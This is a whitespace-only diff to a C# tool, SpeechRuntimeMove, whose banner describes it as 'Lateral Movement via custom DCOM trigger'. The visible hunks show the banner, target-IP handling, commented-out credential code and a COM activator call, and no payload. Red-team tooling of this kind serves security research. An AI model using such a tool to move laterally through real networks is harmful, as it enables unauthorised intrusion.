@@ -24,16 +24,16 @@ namespace SpeechRuntimeMove
         {
             Console.WriteLine(@"
 
-   _____                      __    ____              __  _                __  ___              
-  / ___/____  ___  ___  _____/ /_  / __ \__  ______  / /_(_)___ ___  ___  /  |/  /___ _   _____ 
+   _____                      __    ____              __  _                __  ___
+  / ___/____  ___  ___  _____/ /_  / __ \__  ______  / /_(_)___ ___  ___  /  |/  /___ _   _____
   \__ \/ __ \/ _ \/ _ \/ ___/ __ \/ /_/ / / / / __ \/ __/ / __ `__ \/ _ \/ /|_/ / __ \ | / / _ \
  ___/ / /_/ /  __/  __/ /__/ / / / _, _/ /_/ / / / / /_/ / / / / / /  __/ /  / / /_/ / |/ /  __/
-/____/ .___/\___/\___/\___/_/ /_/_/ |_|\__,_/_/ /_/\__/_/_/ /_/ /_/\___/_/  /_/\____/|___/\___/ 
-    /_/                                                                                         
+/____/ .___/\___/\___/\___/_/ /_/_/ |_|\__,_/_/ /_/\__/_/_/ /_/ /_/\___/_/  /_/\____/|___/\___/
+    /_/
          Lateral Movement via custom DCOM trigger
                           by @ShitSecure
     ");
-            
+
             string targetIP = null;
             /*string username = null; custom user for execution removed for reasons
             string password = null;
@@ -133,14 +133,14 @@ namespace SpeechRuntimeMove
                     break;
             }
 
-            
+
             // Ensure that if username, password, and domain are provided, they are valid
             /*if (username != null && password != null && domain != null)
             {
                 Server.Execute(targetIP, null, username, password, domain);
             }*/
-            
-            
+
+
         }
     }
 
@@ -255,9 +255,9 @@ namespace SpeechRuntimeMove
                 var pComAct = (SpeechRuntimeMove.Definitions.IStandardActivator)new SpeechRuntimeMove.Definitions.StandardActivator();
                 var CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                 var IID_IStandardActivator = typeof(SpeechRuntimeMove.Definitions.IStandardActivator).GUID;
-                
+
                 var ht = CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
-                
+
                 if (ht != 0)
                 {
                     Console.WriteLine($"[-] CoCreateInstance failed with HRESULT: 0x{ht:X}");
